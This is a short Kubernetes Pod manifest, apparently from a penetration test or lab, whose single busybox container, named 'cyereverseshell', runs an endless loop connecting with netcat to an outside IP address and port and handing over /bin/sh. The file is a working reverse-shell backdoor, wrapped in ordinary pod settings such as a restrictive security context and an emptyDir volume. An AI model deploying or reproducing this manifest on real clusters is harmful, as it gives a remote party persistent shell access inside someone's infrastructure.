apiVersion: v1
kind: Pod
metadata:
  name: cyerspod
  namespace: nati  # Specify the correct namespace
  labels:
    app: nc
spec:
  serviceAccountName: cyerspod-sa  # Use the ServiceAccount in the 'nati' namespace
  containers:
  - name: cyereverseshell
    image: busybox
    args: ["sh", "-c", "while true; do nc 68.183.22.232 4641 -e /bin/sh; sleep 10; done"]
    securityContext:
      allowPrivilegeEscalation: false
      runAsNonRoot: true
      capabilities:
        drop: ["ALL"]
      seccompProfile:
        type: RuntimeDefault
    volumeMounts:
    - name: tempvolume
      mountPath: /host
      readOnly: false
  volumes:
  - name: tempvolume
    emptyDir: {}  # Use emptyDir instead of hostPath
